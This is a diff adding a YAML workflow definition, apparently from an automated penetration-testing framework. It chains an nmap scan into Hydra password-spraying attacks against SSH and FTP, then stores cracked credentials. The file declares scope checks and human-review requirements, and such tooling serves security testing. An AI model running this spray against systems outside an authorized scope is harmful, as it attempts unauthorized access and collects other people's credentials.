@@ -1,0 +1,88 @@
+author: hermes
+created: '2026-05-13T19:12:00-04:00'
+description: >
+  Network authentication spray molecule. Chains nmap port discovery
+  into conditional Hydra credential attacks against SSH (port 22)
+  and FTP (port 21) services, then saves all cracked credentials
+  to session memory.
+id: auth.network.spray
+implementation:
+  kind: compose
+  dag:
+    port_scan:
+      atom: kali.nmap
+      inputs:
+        flags: -sV -Pn -T3 -p 21,22
+        target: '{{inputs.target}}'
+    ssh_spray:
+      atom: auth.hydra
+      inputs:
+        target: '{{inputs.target}}'
+        service: ssh
+        user_list: '{{inputs.user_list}}'
+        pass_list: '{{inputs.pass_list}}'
+        port: 22
+      depends_on:
+        - port_scan
+      condition: >-
+        {{steps.port_scan.result}}
+    ftp_spray:
+      atom: auth.hydra
+      inputs:
+        target: '{{inputs.target}}'
+        service: ftp
+        user_list: '{{inputs.user_list}}'
+        pass_list: '{{inputs.pass_list}}'
+        port: 21
+      depends_on:
+        - port_scan
+      condition: >-
+        {{steps.port_scan.result}}
+    save_findings:
+      atom: mem.write_session
+      inputs:
+        path: findings/cracked_creds.json
+        data:
+          molecule: auth.network.spray
+          target: '{{inputs.target}}'
+          scan: '{{steps.port_scan.result}}'
+          ssh_results: '{{steps.ssh_spray.result}}'
+          ftp_results: '{{steps.ftp_spray.result}}'
+      depends_on:
+        - ssh_spray
+        - ftp_spray
+inputs:
+  target:
+    required: true
+    type: string
+    validator: rfc1123_host_or_ip
+    description: Target hostname or IP to spray credentials against.
+  user_list:
+    required: true
+    type: string
+    description: Path to username wordlist file.
+  pass_list:
+    required: true
+    type: string
+    description: Path to password wordlist file.
+kind: molecule
+outputs:
+  type: auth.network.spray.v1
+preconditions:
+- scope.includes(inputs.target)
+- network.reachable(inputs.target)
+promotion:
+  required_distinct_inputs: 3
+  required_success: 3
+  requires_human_review: true
+reversible: false
+risk: high
+side_effects:
+- network_probe
+- credential_attack
+- memory_write
+tier: global
+trials:
+  failure: 0
+  last_run: null
+  success: 0
